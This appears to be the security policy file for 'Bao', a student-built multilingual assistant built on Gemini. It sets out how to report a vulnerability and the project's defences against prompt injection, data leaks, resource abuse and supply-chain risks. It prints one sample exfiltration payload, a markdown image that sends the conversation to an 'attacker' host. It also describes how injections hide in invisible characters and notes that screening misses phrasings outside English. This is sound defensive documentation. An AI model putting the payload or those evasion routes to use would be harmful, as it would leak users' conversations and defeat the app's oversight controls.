# Security

## Reporting a vulnerability

Please report security problems privately, through GitHub: open the
repository's **Security** tab and choose **Report a vulnerability**. Don't
open a public issue for anything that could be exploited before it is fixed.
Reports are read and answered as soon as possible; this is a student project
maintained by one person, so no response time is guaranteed.

Only the `main` branch is supported.

## What Bao protects, and how

Bao is an assistant that people ask about health, safety and government
services, in eleven South African languages. It holds a Gemini API key and
it reads documents that users upload. The controls below are grouped by
the threat they address. Every control in the application code has a test
that fails if it lapses, in `tests/test_security.py`, `tests/test_config.py`,
`tests/test_knowledge.py`, `tests/test_generation_retry.py` and
`tests/test_speech.py`. The CI and repository controls (pip-audit, CodeQL,
Dependabot, secret scanning) are checked by GitHub itself.

### Secrets

- The API keys (`GEMINI_API_KEY`, `HF_TOKEN`) live only in `.env`. It is
  excluded by `.gitignore` and `.dockerignore`, so it is never committed
  and never baked into an image; Docker Compose passes it in at run time.
- Git history has been checked: no key, token or private key has ever
  been committed.
- GitHub secret scanning and push protection are enabled on the
  repository, so a key pushed by mistake is blocked or flagged at once.
- `scripts/check_archive.py` checks a folder or zip for keys before it is
  shared.

### Who can reach the app

- `streamlit run` listens on **this machine only** (`.streamlit/config.toml`,
  `server.address = "localhost"`). Streamlit's default is every network
  interface, which put the app, and the API key behind it, on whatever
  network the laptop was on.
- Docker Compose publishes the port on `127.0.0.1` only.
- To share on a local network deliberately, see "Run locally" in the
  README.
- The web app asks for a sign-in before anything else is set up
  (`bao/core/auth.py`). Accounts are local, so it works offline, and
  only a salted scrypt hash of each password is kept, in `users.toml`,
  which `.gitignore`, `.dockerignore` and `scripts/check_archive.py` all
  keep out of anything shared. Five wrong passwords lock a name for a
  minute, across browser tabs, and an unknown name gets the same answer,
  after the same work, as a wrong password. Signing out clears the
  session's conversation and uploads.
- Sign-in protects the page, not the machine: anyone at the laptop can
  run `scripts/add_user.py`, or set `require_login = false`.

### Prompt injection (OWASP LLM01)

- User input is screened for known injection phrasings. The screening
  sees through the usual disguises: invisible characters, full-width
  letters, look-alike Cyrillic letters and punctuation between the words.
  A list of ordinary questions ("how do I enable developer mode on my
  phone") is tested to stay allowed.
- Invisible and reordering characters (Unicode tag characters,
  bidirectional overrides, zero-width spaces) are **removed** from user
  input and from uploaded documents before anything reads them. They are
  how an instruction hides from a human reviewer while staying legible to
  a model.
- Uploaded documents reach the model inside an explicit untrusted-data
  fence that the document cannot close, and the system instruction says
  that anything inside it is data, never instructions
  (`bao/ai/prompts.py`).

### Unsafe output handling (OWASP LLM02 / LLM05)

- Every reply, uploaded excerpt and user message is rendered through
  `safe_markdown`, which turns markdown images into links. An image loads
  the moment it is drawn, with no click, so a reply containing
  `![](https://attacker/?q=<conversation>)` would otherwise deliver the
  conversation to that server. This is the standard way data leaks out of
  an LLM chat interface.
- File names and transcriptions are escaped before display.
- Raw HTML is never rendered: `unsafe_allow_html` is used only for the
  app's own fixed "thinking" indicator.

### Excessive agency (OWASP LLM06)

- The model is given no tools, and automatic function calling is
  explicitly disabled. It can only return text.

### Unbounded consumption (OWASP LLM10)

- Messages are limited to 500 characters (in the chat box and on the
  server).
- Uploads: 10 MB per file (in the browser and on the server), 300 PDF
  pages, 2,000,000 extracted characters, and 400 indexed chunks per
  session. Text is cut to what fits **before** it is chunked, so a large
  file costs no more than a small one.
- Every Gemini request has a 60-second timeout and a 4,096-token output
  limit. The SDK's defaults are no timeout and no limit.
- Network voices have a 90-second limit.

### Privacy

- Each visitor has their own conversation memory and document store, and
  uploaded documents are kept in memory only, never written to disk.
- Logs never contain what anyone typed or what Bao replied: retrieval
  logs query lengths, not queries. Third-party loggers are held at
  WARNING, because Coqui TTS logs every sentence it speaks at INFO.
- Streamlit's usage statistics are switched off, and visitors see a
  generic message instead of a traceback when something fails.

### Supply chain (OWASP LLM03)

- Python dependencies are audited for known vulnerabilities by
  `pip-audit` in CI on every change, and Dependabot proposes updates
  weekly.
- GitHub Actions are pinned to full commit SHAs, the Docker base image to
  a digest, and the third-party South African voice model to the exact
  Hugging Face revision that was listened to (`COQUI_SA_REVISION`).
- Meta's voice models must load from `safetensors`, a format that cannot
  run code. The Coqui checkpoint is a pickle, loaded by torch with
  `weights_only=True`, which refuses to run code.
- CodeQL scans the code with GitHub's security-extended queries on every
  change and weekly.
- The Docker image runs as an unprivileged user, has no compiler
  toolchain, and cannot rewrite its own code. Compose also drops all Linux
  capabilities and forbids privilege escalation.

## Known and accepted risks

Stated so they are read, not discovered.

- **Prompt injection is mitigated, not solved.** Screening catches known
  English phrasings only; an instruction written in isiZulu or Sesotho,
  or phrased in a new way, gets through. What stops the worst outcomes
  does not depend on spotting the phrase: the model has no tools, image
  exfiltration is blocked, and documents are fenced as untrusted data. The
  model can still be persuaded to say something wrong.
- **The optional speech stack pins `transformers` below 5.0**, because
  coqui-tts 0.27.5 needs a function that 5.0 removed. `pip-audit` reports
  eight advisories against 4.57.6, all fixed only in 5.x. Checked against
  the code on 2026-09-29, none of them reaches a path this app uses: they
  concern checkpoint-conversion scripts, the `Trainer`, LightGlue and
  `save_pretrained`, and one malicious `config.json` loaded from an
  attacker's model repository. Bao loads models only from Meta's official
  `facebook/mms-tts-*` repositories and the pinned Coqui revision. The
  speech stack is not in the Docker image, and CI audits only what ships.
  A ninth, CVE-2026-80047 (GHSA-x9r9-c232-4q39, Dependabot alert 1, from
  2026-10-06), covers every version coqui-tts accepts (4.49 to 5.8.1) and
  has no fixed release yet: `load_custom_generate()` caches a model
  repository's custom generation code before asking for consent, though
  running it stays gated. It is reached only by generating text with
  `transformers` and a `custom_generate` repository. Bao uses
  `transformers` only to speak, through `VitsModel`, and coqui-tts passes
  the argument on only in XTTS, which Bao does not load (checked
  2026-10-11).
- **The South African voice model is licensed CC-BY-NC-4.0** and has no
  published evaluation; see the README.
